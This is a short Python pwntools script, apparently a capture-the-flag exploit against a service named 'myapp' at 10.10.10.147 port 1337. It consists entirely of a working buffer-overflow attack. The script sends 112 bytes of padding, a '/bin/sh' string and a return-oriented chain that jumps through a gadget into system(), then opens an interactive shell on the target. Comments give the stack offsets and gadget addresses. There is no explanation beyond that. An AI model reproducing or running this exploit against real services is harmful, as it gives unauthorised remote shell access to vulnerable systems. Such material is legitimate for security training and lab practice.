import pwn

#p = pwn.gdb.debug ('./myapp', 'b main')
p = pwn.remote ('10.10.10.147', 1337)
pwn.context (os='linux', arch='amd64')

#0-111 bytes > rsi
#112-119 bytes > rbp
#120-INF bytes > rsp
bff = ("a" * 112).encode ()
shell = ("/bin/sh\x00").encode ()
system = pwn.p64 (0x401040) #SYSTEM ADDRESS (load into r13)
test_function = pwn.p64 (0x401152) #TEST ADDRESS
r13 = pwn.p64 (0x401206)
zero = pwn.p64 (0x0)

#p.recvuntil ('What do you want me to echo back?') # wait until this message appear and then send;
p.sendline (bff + shell + r13 + system + zero + zero + test_function)
p.interactive ()
